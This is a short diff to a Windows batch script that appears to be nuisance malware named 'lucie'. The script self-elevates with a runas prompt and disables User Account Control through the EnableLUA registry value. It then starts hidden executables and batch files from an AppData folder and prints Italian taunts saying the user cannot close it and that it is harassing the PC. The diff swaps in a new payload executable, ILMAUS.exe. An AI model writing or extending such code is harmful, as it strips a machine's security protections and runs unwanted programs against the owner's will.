@@ -149,10 +149,11 @@ exit
 if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 cd "%userprofile%\AppData\Roaming\lucieengine"
-start /min "" StartaDue.bat
+start /min "" ILMAUS.exe
+echo sapevi che la lucie non vuole che tu possa chiudermi di nuovo?
 start /min "" icspi.bat
 start /min "" sera.exe
-echo la lucie non vuole che puoi chiudermi!
+echo la lucie non vuole che possa chiudermi!
 echo.
 ping 127.0.0.1 -n 3 > nul
 echo la lucie sta molestando il pc
